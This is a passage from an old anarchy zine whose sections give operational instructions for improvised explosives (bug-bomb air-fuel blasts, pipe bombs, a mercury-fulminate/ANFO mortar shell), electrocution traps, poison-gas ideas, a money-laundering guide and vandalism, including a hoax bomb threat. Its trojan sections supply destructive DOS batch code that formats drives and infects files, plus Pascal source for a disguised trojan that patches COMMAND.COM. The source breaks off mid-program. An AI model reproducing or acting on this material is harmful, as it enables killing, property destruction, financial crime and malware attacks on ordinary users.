      one is finding a way to get the keys.. But once you get one set of
      soda machine keys, Copy them or just keep em! They will work on any
      soda machine, so you can get FREE ones! Of course, we know that 
      the real anarchist would take the whole damn machine. Hehhe.. perhaps
      you could get into one of the machines and insert some soda can bombs,
      which i believe FBI covered in one of the earlier issues.. As you can
      see, this one has many interesting applications... :)

    * Electrifying Different Household Metal Objects
      
      Metal chairs, toasters, doorknobs, TV antennae, fans, whatever.. Its
      pretty funny to watch someone get fried trying to open a door or turn
      on a fan heheh..  I am sure all of you out there know how to apply
      this one...

    * About Lethal Liquids and Blowing Fans...

      You know how some gases are very noxious and can cause people to
      get sick or die?  You know there are formulas out there for liquids
      that will give off some sort of noxious gas (i.e. Chlorine gas, 
      Tear gas, etc) and you know that fans will push vapors in whatever
      direction you desire.. WELL?!!?

    * Microwaves, Refridgerators, Ovens, Toasters, Coffee Makers, Etc.

      Think about it.  ANYTHING can poison or make these things explode.

      
      Ok, I'll leave you with those little ideas to think about.. Enjoy!

			 The RAY-CON DEFOGGER BOMB!

Yessiree.. I've done it again..  purely by accident this time.  Another 
weapon of mass destruction!  Once again..  the person whom you hate most in 
the world..  that wacky..  loonytunes idealist..

		   GaRbLed "don't call me garby" UsEr  !!

Hi there..  sorry about the above rabble..  I got carried away. (put me down)

Ok  first.. I'll tell you my inspiration for "creating" this device.  WAY 
back when I was a wee one (bout 10).  I like other maladjusted teens had a 
paper route.  (goddamn beasts didn't pay me min wage even!)  Anyways..  Like 
all paperboys..  I got bored as all hell while doing this mundane task, so I 
started to read the newspaper.  One day I saw the funniest thing.  Some guy 
bug bombed his house, and forgot to blow out the pilot lights on his stove.  
Apparently, when he closed his door behind him,  his house blew up, and put 
his door THROUGH his neighbor's car.  Not to mention the blown out windows, 
loss of ALL interior, and a missing wall.

Amazing what $6.99 will buy you today.  Anyways..  after years and years of 
laughing about this in my head.. It occurred to me.  Wow.  imagine the fun I 
could have..  So I offer to you,

	 GaRbLed User's top ten List of things to do with bug bombs!

1:  The candle grenade

This one is easy, and requires NO intelligence whatsoever.  All ya gotta do 
is this.  Get a candle, a BIG one that will burn forever.  Now look at the 
house you want to detonate.  Divide the number of rooms in the house by 2.  
Now buy that many roach bombs.  Ok, now go through the house, putting one in 
every other room, so that eventually, all the rooms will be filled with the 
mist.  Now,  place you candle in some spot the mist will get to easily, but 
it will take about 5-6 minutes to get there.  Now run through the house 
setting off all the bombs as you go along, and right before you book it, 
light the candle.  The spray will eventually get to the candle, and the 
entire house will become one huge air-fuel explosion.

2:  Bug BOMB

Ok..  buy three bug bombs.  Tape them together like sticks of dynamite with 
some heavy duty Mister hamster duct tape.  Now take these, and place them 
inside a metal container just BARELY big enough to house them.  Now take this 
container, and fill the remaining space with blackpowder.  Seal the container 
NICE AND TIGHT.  Run a wick to it.  Ignite it, and watch the fun!

3:  bug Dynamite

Take a piece of copper tubing 1 inch in diameter, and 8 inches long.  Now 
take one end, flatten it, and fold it over twice.  Now fill the tube up most 
of the way with pyrodex/guncotten.  Now put it in the freezer till it gets 
nice and cold.  Or just hold ice on the outside.  Put a wick in through  the 
open end of the pipe.  Now take a pair of pliers, and flatten the other end, 
and fold it over twice.  Or just make a thin pipe bomb, which is what you are 
basically doing here.  Wrap this in the center of three foggers, and duct 
tape them together.  Light the wick and THROW REAL FAR!

4:  Burning Bugs.

This is fun, and easy to do.  All you need is a lighter, and a bug bomb.  
Simply turn the bomb on, and light the fumes.  You will get a nice flame 
thrower.  And you can do cool special effects with them too!  Like putting 
them in your driveway and standing between them.  Create pentagrams and 
triangles with them.  Scare/singe your neighbors!  Have a blast.  You will 
get from 3-6 feet of fire from them usually.  Warning.  This IS dangerous, if 
the cans overheat, they might explode.

5:  Bug Missle

Grab a propane burner, and a bug bomb.  Set the bug bomb up on a stand of some 
sort, so the tank can be placed underneath it.  Ignite the burner and RUN.  
The gas inside will heat up, and explode through the bottom, and rocket 
skyward.  It's better than a firework, and costs less per shot!

6:  Bugs Away!

Get up on a high roof top, at least 2 or 3 stories.  Light up a bug bomb, and 
wip it at the ground as hard as you can.  If you throw hard enough, it will 
explode in a BIG fireball, eliminating your target.

7:  Row of bugs.

Take a WHOLE lot of bug bombs, and line them up down the road, so each one 
points at the other, in series.  In other words, so the first points at the 
second, the second at the third, etc etc.  Now, run down the row of them, 
turning them all on, and you should get to the first one.  Now toss a match, 
and get the fuck out of there.  The whole row will light up, as long as you 
placed them close enough together. (4-5 feet apart)  Soon the whole row will 
explode, and you can say goodbye.

8:  Bug torch

Take a bug bomb.  Hold it, and light it up.  Now run around with it, and torch 
people.  Just like a flamethrower.  However, there is the danger of explosion, 
so be careful.  If the can gets warm, ditch it.

9:  Water bugs

Simply turn a bug bomb on, and drop it in a pool, or body of water.  Either A) 
you have just poisoned the water.  Or B) You can light it as it comes out of 
the water for a SICK effect.  It will quickly kill anyone in the pool either 
way.

10: Bag o' bugs

Take a large garbage bag, as big as you can find.  Now take a rock, and 2 
rolls of roll caps.(toy guns)  Wrap the rock in the roll caps.  Now put the 
bug bomb, and the rock in the bag.  Make sure the rock is at the BOTTOM of the 
bag, so it hits the ground first.  Now tie up the bag to seal it.  Now find a 
TALL building to drop it off of.  At LEAST 7 stories.  Turn on the bugbomb, 
and drop the bag.  It will inflate on the way down, and explode when it hits 
the ground.  Nice BIG explosion.

			    How To Build a MORTAR
			    ---------------------

To Tell you the truth..Mortars are NOT the best weapons.  But they serve 
thier purpose..  A nice shell, delivered a short distance,  With little or no 
flight noise.  Not only this.. But remember.. A mortar does ALOT of damage.  
The one discussed here will be:
a) Double the explosive power of a military issue mortar.
b) Half the size.
c) But only travels 3/4 the distance.

Ok.. Here's a list of supplies.. I'll put it this way to you before we start 
however.  This is not a TOY!  unlike the thermal cannon, this is a REAL 
weapon.  This is the sort of thing you use to pay back your debt to society 
in FULL.  This will KILL.  As in TANKS, CARS, HOUSES, SMALL BUILDINGS!  This 
is meant to be used to destroy.  Once you use it..  you had better have a 
quick way to Libya, or forget freedom for very long.

(1) 8d nail.
(1) Nickel.  As in currency.
( ) Lots of Aluminum cans.
( ) Lotsa Aluminum Foil.
( ) Amonium Nitrate.
( ) Kerosene.
( ) Plaster O Paris
( ) Oven, preferably self cleaning.
(2) 3/4" LEAD nuts.  W/ 1/4" Hole.
( ) Mercury Fulminate.
( ) 3' 6" long, 2" I.D METAL PIPE.
( ) 1" Nut.  Must be 1/2" thick.

This won't be easy!

Ok..  Part one..  YOUR MORTAR..  This is EASY.

Ok..  Take your pipe, and smoothe the insides.  This is a whole lotta fun.  
Good luck finding something to do it with.  I just use a metal file, and then 
move down to metal sandpaper.  It will take you a few days.  MAKE SURE IT IS 
SMOOTH AS HELL.  IF THERE ARE ANY BURRS IN IT, You will die.  Sound fun?  
Keep reading.

Now,  Grab an end cap that will fit TIGHTLY.  Take that nice nut you 
purchased, and glue it to the center of the inside of the cap.  Now screw the 
cap on the end.  And secure it with Formagasket.

Duh.. yer done.  You now have a mortar.  Was that so hard?  Hell no.  That 
was easy.  THIS is hard.  You need a SHELL for your mortar.

Ok..  Grab that plaset of paris.  Now guess what.  You are going to make a 
CAST for your shell.  Why?  Because you are going to MELT DOWN ALUMINUM, and 
pour it in, to make a shell.

Ok..  Here's a diagram of your shell.


	      --------------------------------
	       \
		\
		 \

	      --------------------------------


		   -----------_____
				   -----____
					    |
					    |
					____|
			      _____-----
		   -----------

The V in the back should be EXTRA thick.  The two peices should fit inside 
one another, and be BARELY thicker than an aluminum can.  Guess what?  You 
have to make a cast, so when you pour the Molten aluminum in, It forms these 
two peices.  Remember.. These are cross sections.  The finished products 
should be perfectly round.  So that "v" should come to a point in the center, 
like a cone.

Ok.  You built your casts?  Really..  not bad..

Now take your aluminum cans, and using pliers, tear them into little bits.  
Now go down to the local science store, and buy a nice big crucible.  Put all 
your little bits of aluminum in it, and put it in the oven.  Set your oven on 
"SELF CLEAN"  It should melt the aluminum.  If your oven isn't hot enough,  
you could use solder..  but it's not as light, and your shell won't fly as 
far.  Ok now when the aluminum is all melted grab the crucible with your bare 
hands.  Oh don't worry, it's only 1,200 Degrees F'.  DUH!  USE FUCKING TONGS.  
DON'T EVEN THINK ABOUT GLOVES! Now pour it into your molds, and make sure all 
is fine and dandy.  it may take you a few tries before all is keen, so be 
prepared to try again.

Now wait for your molds to cool.  Should take awhile.  Turn the oven off in 
the meantime.

Now when everything is nice and cool.. (BE PATIENT.. wait a day if you have 
to!)  Take the top portion, the one shaped like a cone, and drill a small 
hole in the flat end.  Not too big.  Now take your two lead nuts, and glue 
them into place behind the hole, on the inside.  This will weight the nose 
down, but should still leave a nice big hole that you can see CLEAR THROUGH.

Ok..  Now grab the other peice.  Now using a torch, and some lead, Secure the 
head of the nail, to the inside of the V.  So the nail sticks out the bottom 
of the shell.  -->  Get it?

Now saw the nail off flat about 1 inch below the head.  JUST below the bootm 
of the shell.
  \
 -->
  /

Get it?

Now using the torch, and lead, secure a nickel onto the nail.
|->
Get it?

Ok..  Your shell casing is complete.  Now using sandpaper to rough things 
out, make sure the nose fits snugly inside the base.  The entire structure 
should be the following dimensions.

JUST UNDER 2 inch diameter.
4 inches long.
The end of the nose, should be 3/4 in diameter.
The rear cone, should be 3/4" higher than the base.

Ok..  Now yer all set.Now get out the aluminum foil.  Make a package of 
Mercury fulminate one centimeter thick, that will fit evenly on the end of 
the nickel  Glue it on.  Take some aluminum foil, and wrap it around the nuts 
on the inside of the nose cone.  Now fill the hole with merc. And place a 
small package on the outside of the flat end.  FILL the inside of th4e rear 
cone with Solid Rocket propellent.  It should be in powder form, but packed 
nicely.  Now fill the inside of the shell with ANFO.  Amonium Nitrate Fuel 
Oil explosive.  94% AN, 6% kerosene.  Close the shell up, and wrap it in 
Aluminum foil Tightly.  Give it some duct tape to hold it together.  And look 
at it.

The front should weigh more than the rear.  if not.. Add something to make it 
so.

OK..  Now to test it out.  Stick your mortar into the ground.  Bury the end 
about 2 inches deep.  Make sure it won't go anywhere when the shell goes off.  
Now aim it at about a 50' angle.  Drop the shell in the top, REAR END FIRST.  
THE NOSE MUST POINT TO THE TOP OF THE TUBE. WHEN THE SHELL IS AT THE BOTTOM. 
otherwise it will detonate.  Not like you care.

What will happen?  Simple.  You drop the Shell.  Shell hits the nut in tube.  
Nickel smashes the Mercury Fulminate against the Nut at the bottom.  Mercury 
fulminate detonates.  Ignites Solid Rocket propellant.  Shell rockets into the 
air.  Shell lands nose first.  Shock of landing causes merc. Fulm. in nose to 
detonate.  Detonation Detonates ANFO.  ANFO detonates surrounding area.

Now go take aim at an oil tanker, or a gas station.  Or both.  (oil tanker 
parked at gas station!)

		     Garbled's Guide to laundering Money

Here we go!

  This month I will be looking at different ways to launder all sorts of cash.  
Just in case you didn't know..  Here's a FACT.
The government KNOWS the existence, names, and important information on nearly 
25% of all large scale drug dealers.  They even have proof to bust em.  Wanna 
know why they don't?  These dealers PAY TAXES ON THIER INCOME THROUGH 
LAUNDERING!  The government gets a cut.. It don't give a shit.

First.  Laundering Quarters.

Ok.. HOWEVER you managed to get your hands on a whole ton of quarters. the 
point is, You have 6000 of them.. and want to buy a stereo.  Now to be 
realistic about it..  You COULD just go down to the store and buy the $1000 
device in quarters.  It IS US CURRENCY.  They MUST ACCEPT IT!
But realistically, yer gonna get a call from the FBI about it..  NO ONE saves 
up 4000 quarters.  It's a very suspicious thing to do.

Ok..  this is fairly easy.  You can do it one of two ways..  The safe way, and 
the VERY safe way.

First..  Grab your yellow pages, find yourself a nice, establishment that 
sells arcade video games, and quarter-op Vending Machines.  Pick something 
cool.  Anyways.  Now you have this.. Apply for a vending machine licence from 
the state.  Now go to a lame corner store, and ask the owner's permission to 
put the games in his store.  He will most likely agree, because it will bring 
in business for his pathetic little store.

Now..  this all costs MONEY!  Yes..  you have to SPEND money, to MAKE money.  
Don't do this if you are only going to be ripping off quarters once in your 
life.  This is a tactic for the REGULAR thief.  Now what happens? How do you 
change your quarters to dollars?  HMMMmmm?

Simple..   every week, Walk down to your store, and open it up and empty the 
machine.  Now go to the bank, and get some quarter rolls.  Now lets put this 
into perspective...

You make $20 a week from your machine.  You steal $500 a month from your 
escapades.  Ok..  What do you do?  Every week, Roll a total of $145 in 
quarters, and take it to the bank.  Be nice, deposit it.  Withdraw whatever 
you want for your own personal need, and let the rest gain interest.  BE 
CAREFUL.  Watch your balance.  DO NOT LET YOUR INTEREST TOTAL MORE THAN 400 A 
YEAR!  OK..  now here's the important part.  When april 15th comes around, PAY 
YOUR TAXES!  PAY them!  DON'T cheat!  Pay the taxes on the whole $500 a month.  
Now you have a legitimate BUSINESS, with a legitimate income, and a legitimate 
owner.  You pay the taxes, and you've just completed the circle.

That was the VERY SAFE method.  now remember..  this is just laundering.. you 
get caught stealing the quarters.. and yer on yer own..

Ok, now the semi-safe method.  This is for those of you, who simply pulled one 
job, and don't intend to do it again.  Take your quarters, and roll them.  Now 
take them around to stores, and banks, and change them in groups of 5.  It 
will take forever, but NO ONE will ask questions.  Just ask for large bills, 
and be happy.  DO NOT declare this on your income taxes.  You have no logical 
avenue to describe where this money came from.  This is the danger..  be 
careful what you buy, or the IRS will be up your asshole so fast your nose 
will fly off.


Singles and Fives.

This is difficult.  Now you are attempting to launder small bills.  The only 
reason anyone in thier right mind would want to do this, is so they could 
make large purchases.  I'll state right now, your gonna end up paying taxes 
on this no matter which way you go.

Numba one:
Open a BUSINESS.  This requires only limited funding.  Now here's the catch.  
It has to be a SERVICE ORIENTED BUSINESS.  And you have to watch what you do..  
Don't make too much.  Now here's how it works.
You file your taxes.  Be careful what you do..  Now yer gonna have to do a 
little work to pull this off.  So spend a bit on advertizing.. and clean a few 
rugs or something.  Now, DON'T KEEP ANY BOOKS!  DON'T keep track of your 
expenses.  It is not a crime to keep bad records.  Just make sure you declare 
ALL of your income.  To be safe.. declare a little extra.  They won't ask 
questions unless they feel you have tried to cheat them.  Keep NO receipts, 
KEEP nothing.  As usual, just take your money to the bank, and open a checking 
account or something.

Numba Two:
Ok..  you can use the above semi-safe method to do it once.  But be advised.. 
it's NOT very safe in this case.  You're dealing with large amounts of cash 
here..  so be advised.

Numba Three:
Buy a change machine.  Put it next to your nice big Arcade game from the 
above idea.  Now what?  Simple..  You're getting 2 jobs done in one..  Number 
one..  Your quarters are getting laundered through the change machine, and 
through your arcade game.  And you can now take your bills to the bank, and 
launder them.  Both of em, in one nice bundle.

Laundering LARGE Bills.  10's 20's 50's 100's

Ok.. this is the big one..  No fooling around here.. I don't really CARE how 
you are getting this money.. AHEM..  anyways.. here's how you do it..

Open a BIG BUSINESS.  Now..  use this chart.. to decide your BUSINESS size..:

You launder |  # of employees | Initial Investment
------------+-----------------+-------------------
50,000      |  2-5            | about 4,000
100,000     |  10-20          | about 10,000
500,000     |  100-200        | about 50,000
1,000,000   |  400            | about 100,000

Ok.  You're cutting it thin when you do this much.

Start a BIG BUSINESS..  Were talking full BUSINESS.  You need assets, 
employees and everything.  Just keep it afloat.  You might make a bit of 
profit..  but here's where you fly.  CHARGE OUTRAGEOUS PRICES.  KEEP NO 
RECEIPTS!  Why?  Ok..  let's look at this.  You own a wooden duck 
retailer.(yeah yeah)  Now you buy 4000 wooden ducks, at a dollar a piece.  You 
then charge about 10 bux for a duck.  Now, you sell all these ducks, and you 
just made 36,000.  Now you can't possibly hope to sell them ducks at that 
price, so you arrange for them to be bought from your store.  Basically, you 
just want to GET RID OF THEM.  Just throw em in a dump or something..  The 
inventory's gone..  You got money in the bank..  no questions asked.  Now, 
when you get into the REALLY big launder's..  You have GOT to know what you 
are doing..  Take care to keep your employees well paid, and thusly QUIET.  
Get RID of your product any way you can.  Authorize your employees to give 
great discounts on the products, WAY below the list price.  Give out receipts, 
but DON'T KEEP ANY!  Once again.. It's not crime to be a bad bookkeeper, as 
long as all your income is declared, and taxed.  DON'T PLAY GAMES..  Don't 
take ANY deductions..  Just pay em, and get the IRS off your ass.  Remember.. 
you're paying taxes on EASY money..  who cares?

Now.. don't take me literally on these.. A little more planning is usually 
necessary.  Don't expect it to be easy.. or go just as I tell you..  There 
ARE random audits..  and I advise you plan for the worst.

Let me just share a bit of wisdom here..

			     The CRIME Equasion
Consider the crime.  What is the maximum penalty.  Assign it to X.
Think about what you think a good yearly salary is.  Assign it to Y.
Now take the amount you will make from the crime, and assign it to Z.

Ok.  if X times Y is greater than Z.
think about it..  Ok..  your gonna sell drugs.  Yer talkin about a penalty of 
about 10 years here.  Not to mention a fine.  A nice yearly salary is about 
40,000 a year.. in my opinion.

Ok  you make a 500,000 drug sale.  Now..  IF you get busted you will be in 
jail for 10 years..  That's 400,000 you could have had honestly.  But you 
made 500,000.  So even IF you get busted.. you came out 100,000 ahead.  is it 
worth it?  Don't Ask me.

			A new twist, on an old Idea.

			   T H E  B L A S T  B O X

Ok..  It's been done.. EVERYONE knows what a blast box is, and what it does..  
but no one has been nice enough to provide schematics for doing this.
So.. me being the nice guy that I am (i don't wanna hear it!) I decided to 
just do this little article to show you people how to actually MAKE one of 
these little toys.  Of course, anyone with some electronic knowledge, or at 
least 4.95 can figure out how to make one, or buy the schematics from Radio 
Shack.

OK.. right here.   First thing you wanna do, Is get your supplies..  I have 
two different audio amplifiers for you.. so take your pick.

AMP #1
(1) 1 meg potentiometer(variable resistor) R2
(1) 1 Meg resistor R3
(1) 47k Resistor R1
(1) 22k Resistor R4
(1) 1 microfarad capacitor C1
(1) N-CHANNEL POWER MOSFET  transistor  Q1
(1) 9volt
( ) Lotsa wire
(1) Telefone
(1) DPDT Switch

Just follow the nasty graphic.  Only connect crossing wires if a "+" is shown 
at the crossing.

GND = Ground


Ok.. for the next one..  This one is a much better AMP with more control over 
the GAIN and Volume.  It also uses chips, which give a much better 
amplification, with more clarity.

Ok.. what You need..
AMP #2
(1) 1k Resistor  R1
(1) 100k Potentiometer R2 (gain)
(1) 10k Potentiometer R3 (volume)
(1) 1 microfarad capacitor C1
(1) 100 microfarad capacitor C2
(1) .1 microfarad capacitor C3
(1) 741 preamplifier chip (ok to use other op amps)
(1) 386 power amplifier chip

Welcome to hell kids.  

			-SEASONAL ANARCHY: Winter Hell-

Snow:

Snow can be fun.  And everyone has hit thier enemy with an iceball at least 
once in their lives.  Why not completely ruin thier lives?  Hit em with a 
fireball.  YES!  Simply pack some calcium carbide in your snowball, wait 10 
seconds for the snow to melt a bit, light it up, an throw.  Nice flaming 
snowball, that gets LARGER (the fire that is) as it burns.

Ever bury your neighbor in his yard with a whole yardfull of snow?  Take a 
water gun, and go around squirting water into locks.  Car doors, houses, gates 
etc.  It solidifies, and they can't get a key in without a blowtorch.  Pour 
water on cars.  Especially around the doors and windshields.  It makes opening 
the door a TOTALLY impossible perspective.  Pour hot coffee on windshields and 
watch them shatter from the heat.  Pour coffee on the blacktop, and watch it 
crack open.  Write obcene messages in driveways with hot coffee.  If you want 
to be particularly rude, shovel a driveway, and put it all on his neigbor's 
doorstep.  With obvious footprints showing that the neighbor is responsible 
for the misplaced snow.  Put some Nitrogen Tri-iodide in your neigbor's halite 
crystals.  (Honey, gonna go salt the driveway...  BOOM.. BOOM.. OUCH!)  Pour 
water on driveways and walkways to form a nice layer of ice.  Make obcene 
snowmen in peoples yards at night.  Napalm some snow, Makes quite a funny 
sight to see a yard burned down in the middle of the winter.  If they have a 
pool, dump a whole SHITLOAD of dry ice into it.  Not only will it look cool as 
hell,  but it might freeze the pool, and crack the entire structure.  Liquid 
nitrogen works even better for this.  Try putting some fish in the pool.  When 
spring comes around, a whole tone of dead fish always makes for an exciting 
cleanup.  Pour water all over the tires of a car.  It will start up, and 
suddenly have NO traction.  If you can, fill his gas tank with water, so it 
freezes and makes a mess of his car.  Now would be an excellent time to empty 
your (or someone elses) pool onto your neigbor's lawn.  Why just imagine how 
pleased he'll be to see 10 inches of ice on top of the snow in his yard. Now 
would be the time to bury any dead animals you might have in someone's snow, 
so they surprise him pleasantly in the springtime.  (Frozen rats look SO cool) 
If you feel it nessecary to casue extreme harm, or distress to people.  Do 
this!  Take a large number of roofing nails, and place them on a driveway some 
night When it's snowing particularly hard.  A light sprinkle of water should 
hold them in place while the snow covers them up.  A) Any car that pulls in, 
will die.  B) Anyone who walks upon the driveway will find out just how think 
rubbers are.  C)  Shoveling is impossible.  If you have an extreme deathwish 
for someone, now would be the time to firebomb his house.  Ever see a 
firetruck trying to do 50 through a blizzard?  Wanna ruin someone's night?  
Splash hot coffee on a window.  Shatters it right up, letting an abundance of 
cold air in.  Or just throw a brick.  Egging can be particularly funny at this 
time of year.  Toilet papering hits new extremes during heavy snow.  Ever see 
what happens to a TPed tree when left unattened to all winter becasue the snow 
camoflauged the TP?  Now is the time to strip a ring of bark from around a 
tree trunk.  That way it will never grow back in the spring.  Ground poisoning 
also goes relatively unnoticed at this time of year.  Buring cow shit in snow 
can have particularly pleasing results in the spring, if you're from kansas. 


Other non-weather related things to do:
    Now is the perfect time to run around a parking lot at the mall hitting 
cars with a rolled up newspaper.  Ever hear 423 car alarms go off in unison? 
Grab a telefone and inform the K-Mart shoppers of a non-existant bomb placed 
near the front doors of the building.  Ever see 200 panicked cheapskates make 
a b-line for the loading dock door?  Grab yourself a bright orange vest, and 
some flags, and "direct" some traffic in a mall parking lot.  Namely, trick 
people into going up the down ramp in the stacked lots.  Tons of traffic fun! 
Jump into an elevator, and when the doors close, start singing christmas 
carols at the top of your lungs.  When the door opens, Quiet up, and wait for 
the door to close before spreading warmth to the elevator patrons again.  
Another good thing to do is to explain to people that you are an undercover 
elf, and they have to give you their toys or there won't be a christmas this 
year.  Sit on santa's lap, and ask him very loudly why you saw him hitting on 
women in the moose lodge last night.  Ask santa for world peace for christmas, 
if he says it's not really possible,  tell him you'll settle for an H-Bomb.  
Hang condoms on mall christmas trees.  Make a moltov cocktail, and ask the 
giftwrappers in the mall to wrap it for you.  Go around explaining to people 
that santa's elves are on strike, and you are collecting signatures for an elf 
pay raise.  Dress up like santa and ask people if they've seen a stray elf run 
by carring a tommy gun.  Threaten to blow yourself up if santa doesn't give 
you a gross of candycanes right away.  If you find a multi-storied mall, peg 
santa off from the top story with candy canes.  Explain to small children how 
there really isn't a santa, and that you have proof.  Then show them a picture 
of a fat man with a scantilly clad female.  Burn santa claus in effigy in a 
mall parking lot screaming "Elves unite, throw down the opressionist laughing 
blob!"  Put condoms on the noses of certain foam reindeer.  Have a small child 
ask santa if elves are considered slave labor.  Collect signatures to allow 
the grinch to steal christmas.  

Well..  thats really ALL I can think of..  Amazing..  I've never in the 
history of FBI had THIS MUCH FUN WITH A SEASON!  Damn..  and here I am stuck 
in a snow-free climate.

			   PATHOGEN PROGRAMMING VI
			  An Introduction to Trojans

By: GarBlEd UsEr

As you all know, a trojan is a file that hides as a useful utility, and then 
nukes the user.  Well..  it's MORE than just that.  There are 4 basic types of 
trojans.  Excluding AnsiBombs.
Batch trojans
Pascal Trojans
C Trojans
ASM Trojans

BATCH TROJANS:

The most common type.  Not because they are powerful, but because they are 
EASY.  Any fool can type DEL *.*.  And if they have any brains, they can 
compile it with a batch compiler.  But not every fool can figure out that if 
he just does that, it will ask Are you sure?

So an OBVIOUS solution is nessecary.
echo y |del *.*

Now that will automatically answer YES to the question.  But the user will 
still see what happened.  Ok.. lets make it more complicated.

@echo off        {the @ sign turns off the echo, and echo off turns it off}
CTTY NUL           {Redirects ALL output to NUL and disallows breaking out}
echo y |format c:               {Formats drive C, without showing the user}
CTTY CON                                             {Returns IO to normal}

Now do you see how much better that is?  All the user will see is his drive 
light going bonkers.

Now lets get a BIT more complicated shall we?

Create a file called x.x

IN that file have the following..
3
1
Y

Now, your batch file.
@echo off
CTTY NUL
fdisk <x.x
CTTY CON

What did this just do?  Automatically load up FDISk, and delete the primary 
partition.  SPLAT.  The user will see nothing, and the system will hang.

Ok.. now to get MORE complicated..  a conditional bomb.

@echo off
CTTY NUL
if exist %1 echo y |del *.*
CTTY CON

If the user invokes the file with a subcommand ( Batch filename.ext )
then the HD will be formatted IF the filename exists.  Or you can replace the 
%1 with a filename.  if the file is found, then the HD dies.

Now to tear your shorts off.  An infectuous trojan. Name it batch.bat

@echo off
CTTY NUL
copy *.bat + batch.bat *.bat
CTTY CON
REM You have been INFECTED!

This will infect all BAT files that are in the current directory.  You can 
make it more vicious if you like.  But it's all up to you.


Pascal trojans.

These are VERY powerful trojans.  You can do some vile things with these.
Absolute disk writes, expanders, 0 diskers, fat disruptors and more.  Pascal 
is an easy to learn language, and is very powerful in TROJAN programming.

C Trojans.

it's just as good as pascal, but for those of you who like C over Pas.  Simple 
matter of preference.

ASM Trojans.

The ultimate trojans.  There is NO equal.  If you can program ASM, you can 
make a trojan that will take out the world.


Ok..  now a contest for ya all.

Make a trojan that will permanently crash a hard drive.

Anyone who can write it up, and send it in, will get the following.
A) Top billing in the next issue of FBI.
B) A permanent MAIL subscription to FBI.
C) Fame beyond one's wildest dreams.

Here's one of the ways to do it.

Spin the hard drive backwards.

WHAT?  How? With a program?  no way!

Here.  Tell the system to look for the HD Controller BIOS in an adress in RAM.  
Now copy the BIOS into that address.  However make one change.  Find the RPM 
speed of the disk platter command.  Set it to a negative number.  This will 
spin the platter backwards, and suck the head down onto the drive.

This CAN be done.. I have seen it.  And it can be written in ANY language.  
Pascal, C, or ASM.

So if you have the skill, send it in, and become FAMOUS!

============================================================================
Skill Level: 3

			  Trad Trojan by Red Dragon
				 -----------

Here is a REAL lurking trojan, written entirely from scratch:
It is not a virus, because this program does not replicate itself and will 
not infect other programs, and it is not a simple trojan because it stays on 
their computer and continues to slowly destroy their morale until they figure 
it out.  I prefer this because when you have a target, there is no need to 
destroy innocent people's lives, but a trojan is too immediately destructive, 
there is no fun in it.  This trojan is evadable by anyone that is careful of 
trojans.  It will be stopped by any simple measures a smart, fearful user 
would make, or by FluShot, VShield, or any similar program.  The only way to 
get around these is to hide the trojan behind a program that would 
legitimately access these. So, on to the trojan.

What is the easiest way to load up a program upon boot-up? If you said modify 
the boot-sector, you are wrong. I said the EASIEST. Think now, how would you 
load something automatically?  Put it in the autoexec.bat. Duh! So how would 
you easily have a trojan load itself up whenever somebody boots up? Put it in 
their Autoexec.bat!! Ok, so, all we have to do is put it in the autoexec.bat 
and write our own TSR trojan.  Loading it is now complete. You want me to 
tell you how many people would never know?  But, I'm not going to be that 
obvious even.  What runs the autoexec.bat? If you said Dos, you are wrong. It 
is not Dos, it is your command interpreter. If you are like 99+% of the 
population, your command interpreter is Command.Com. Go look where it is? 
Root directory? Ok, maybe only 98% have it there. I'll show you how to find 
it wherever it is later, but we'll be content with infecting 98% of the 
population.  Can you set what batch file is automatically run by Command.com? 
No? You mean its not an environment variable? Sure you can, it is right 
there! Look inside Command.Com, what does it say nicely unhidden in there: 
AUTOEXEC.BAT . Now, what if we changed that to say, hmm TRADEXEC.BAT? If you 
guessed it runs that you are right.  Now, what if we hid TRADEXEC.BAT? Still 
work? Yep. Except you are probably wondering won't they notice that when they 
change their AUTOEXEC.BAT it doesn't change anything? What if our 
TRADEXEC.BAT consisted of:
@echo off
CTTY NUL
Trojan.Exe
CTTY CON
Autoexec.bat

Guess what? It invisibly loads up the trojan.exe, and then runs your 
autoexec.bat. Pretty cool, eh? How would you ever know it runs tradexec? 
Well, if you were into looking at your command.com you would. Are you? I 
doubt it.  So, That's it, that is all you do. Go in with a hex-editor and 
change it and you are set.

Of course I'm not going to settle here with just telling you how to write a 
trojan and be done with it.  I'm going to write it.  We are going to write 2 
executable files.  The first executable will be the infector.  This program 
is going to do the following:
 1) Search your COMMAND.COM and modify it to run TRADEXEC.BAT instead of
    AUTOEXEC.BAT.
 2) Create a hidden file called TRADEXEC.BAT which executes our trojan TSR
    and then runs AUTOEXEC.BAT.
 3) Copy our TSR Trojan executable into a hidden file that TRADEXEC will
    execute.
    
On top of this, we are going to write some cover code.  This will be a small, 
fairly useless bit of code that will make the person think, wow, an ok 
utility, but the important point is that they won't be suspicious that it was 
a trojan, the program will do something.  We are just going to fake a 
performance test, everyone loves those. Here is our executor:
TESTER.PAS:

Program Tester;

uses crt,dos;
var com:file of byte;
    trad:text;
    f1,f2:file of byte;
    a:byte;
    count:word;
    h,m,s,hs:word;
    w:longint;
    done:boolean;


function rn:byte;
var rntmp:byte;
begin
read(com,rntmp);
rn:=rntmp;
end;

procedure wn(wntmp:byte);
begin
write(com,wntmp);
end;

begin
clrscr;
writeln('Computing Computer''s Whetstone Index');
writeln('Whetstone Performance Set One Test:');
done:=false;
assign(com,'C:\COMMAND.COM');
reset(com);
gettime(h,m,s,hs);
gotoxy(1,4);
writeln('Start Time: ',h,':',m,':',s,':',hs);
while (not (eof(com)) AND (done=false)) do begin
       w:=filepos(com);
      gotoxy(1,3);
      write('Computing: ',w);
      if rn=65 then if {A}
	 rn=85 then if {U}
	 rn=84 then if {T}
	 rn=79 then if {O}
	 rn=69 then if {E}
	 rn=88 then if {X}
	 rn=69 then if {E}
	 rn=67 then begin {C}
	       seek(com,w);
	       wn(84); wn(82); wn(65); wn(68); {TRAD}
	       done:=true;
	       end;
	 end;
gettime(h,m,s,hs);
gotoxy(1,5);
writeln('Stop Time: ',h,':',m,':',s,':',hs);
close(com);
assign(trad,'TRADEXEC.BAT');
rewrite(trad);
writeln(trad,'@echo off');
writeln(trad,'CTTY NUL');
writeln(trad,'MSDOSIO.EXE');
writeln(trad,'CTTY CON');
writeln(trad,'AUTOEXEC.BAT');
close(trad);
setfattr(trad,$2); {Make file hidden}
assign(f1,'TESTER.DTA');
assign(f2,'C:\MSDOSIO.EXE');
reset(f1);
rewrite(f2);
writeln('Whetstone Performance Set Two Test');
 gettime(h,m,s,hs);
 gotoxy(1,8);
 writeln('Start Time: ',h,':',m,':',s,':',hs);
 count:=0;
while not eof(f1) do begin
 gotoxy(1,7);
 count:=count+1;
 write(count);
